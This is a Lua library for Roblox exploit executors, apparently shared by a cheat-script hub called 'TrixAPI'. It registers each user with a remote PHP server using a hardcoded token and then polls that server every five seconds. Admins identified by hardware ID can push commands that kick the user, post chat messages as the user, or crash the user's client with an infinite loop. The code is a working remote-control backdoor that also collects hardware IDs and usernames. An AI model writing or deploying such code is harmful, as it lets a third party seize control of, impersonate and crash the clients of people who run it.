local TrixAPI = {}

TrixAPI.users = {}
TrixAPI.isAdmin = false
TrixAPI.UI = nil 

local ADMIN_HWID_URL = "https://raw.githubusercontent.com/ZwPEZ/Scripts/refs/heads/main/Other/AdminList.lua"
local API_URL = "https://6rj6esutcoa2pu3qx81weznddd0bzmwbx3vni0501gsvlkolnv.space/RobloxApi/PlayerList.php"
local API_TOKEN = "trix_S5V4tV93sEv1"

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local request_func = (syn and syn.request) or http_request or request or (fluxus and fluxus.request)

local task_wait = task.wait
local task_spawn = task.spawn

local get_hwid = gethwid or function() return "UNKNOWN_HWID" end
local currentHWID = get_hwid()

local success, result = pcall(game.HttpGet, game, ADMIN_HWID_URL)
if success and result then
    for hwid in string.gmatch(result, "[^\r\n]+") do
        if hwid ~= "" and currentHWID == hwid then
            TrixAPI.isAdmin = true
            break
        end
    end
end

local function httpPost(data)
    if not request_func then return nil end
    local body = HttpService:JSONEncode(data)

    local success, response = pcall(request_func, {
        Url = API_URL,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = body
    })

    if not success or not response then return nil end
    local responseBody = type(response) == "table" and response.Body or response
    if not responseBody then return nil end

    local decodeSuccess, result = pcall(HttpService.JSONDecode, HttpService, responseBody)
    return decodeSuccess and result or nil
end

local function registerPlayer()
    return httpPost({
        token = API_TOKEN,
        action = "register",
        server = game.JobId,
        username = LocalPlayer.Name
    })
end

local function fetchPlayerList()
    local res = httpPost({
        token = API_TOKEN,
        action = "list",
        server = game.JobId
    })
    if res and res.status == "ok" then return res.users or {} end
    return {}
end

local function updateDetection()
    local players = fetchPlayerList()
    local new = {}
    for _, name in ipairs(players) do
        if name ~= LocalPlayer.Name and name ~= "None" and Players:FindFirstChild(name) then
            table.insert(new, name)
        end
    end

    TrixAPI.users = new

    if TrixAPI.isAdmin and TrixAPI.UI then
        pcall(TrixAPI.UI)
    end
end

local function checkCommand()
    local res = httpPost({
        token = API_TOKEN,
        action = "checkCommand",
        username = LocalPlayer.Name
    })
    
    if res and res.status == "ok" then
        if res.command == "kick" then
            LocalPlayer:Kick(res.message or "")
        elseif res.command == "chat" then
            local msg = res.message or ""
            local ReplicatedStorage = game:GetService("ReplicatedStorage")
            local TextChatService = game:GetService("TextChatService")
            
            local chatEvent = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
            if chatEvent and chatEvent:FindFirstChild("SayMessageRequest") then
                chatEvent.SayMessageRequest:FireServer(msg, "All")
            elseif TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
                local channel = TextChatService:FindFirstChild("TextChannels") and TextChatService.TextChannels:FindFirstChild("RBXGeneral")
                if channel then
                    channel:SendAsync(msg)
                end
            end
        elseif res.command == "crash" then
            while true do
                while true do end
            end
        end
    end
end

function TrixAPI.sendKickCommand(targetPlayer, message)
    if not targetPlayer or targetPlayer == "None" or targetPlayer == "" then 
        return nil 
    end

    return httpPost({
        token = API_TOKEN,
        action = "command",
        target = targetPlayer,
        command = "kick",
        message = message
    })
end

function TrixAPI.sendChatCommand(targetPlayer, message)
    if not targetPlayer or targetPlayer == "None" or targetPlayer == "" then 
        return nil 
    end

    return httpPost({
        token = API_TOKEN,
        action = "command",
        target = targetPlayer,
        command = "chat",
        message = message
    })
end

function TrixAPI.sendCrashCommand(targetPlayer)
    if not targetPlayer or targetPlayer == "None" or targetPlayer == "" then 
        return nil 
    end

    return httpPost({
        token = API_TOKEN,
        action = "command",
        target = targetPlayer,
        command = "crash"
    })
end

task_spawn(function()
    registerPlayer()
    task_wait(1)
    updateDetection()

    local tickCounter = 0
    while task_wait(5) do
        tickCounter += 5
        task_spawn(updateDetection)
        task_spawn(checkCommand)
        
        if tickCounter >= 20 then
            tickCounter = 0
            task_spawn(registerPlayer)
        end
    end
end)

local updatePending = false
local function requestUpdate()
    if updatePending then return end
    updatePending = true
    task_spawn(function()
        task_wait(1.5)
        updateDetection()
        updatePending = false
    end)
end

Players.PlayerAdded:Connect(requestUpdate)
Players.PlayerRemoving:Connect(requestUpdate)

function TrixAPI:SendChatMessage(text, thumbnail)
    if not text or text == "" then return end
    task_spawn(function()
        httpPost({
            token = API_TOKEN,
            action = "sendChat",
            username = LocalPlayer.Name,
            displayName = LocalPlayer.DisplayName,
            thumbnail = thumbnail or "",
            text = text
        })
    end)
end

function TrixAPI:GetChatMessages()
    local res = httpPost({
        token = API_TOKEN,
        action = "getChat"
    })
    if res and res.status == "ok" and res.messages then
        return res.messages
    end
    return {}
end

if getgenv then getgenv().TrixAPI = TrixAPI end
return TrixAPI
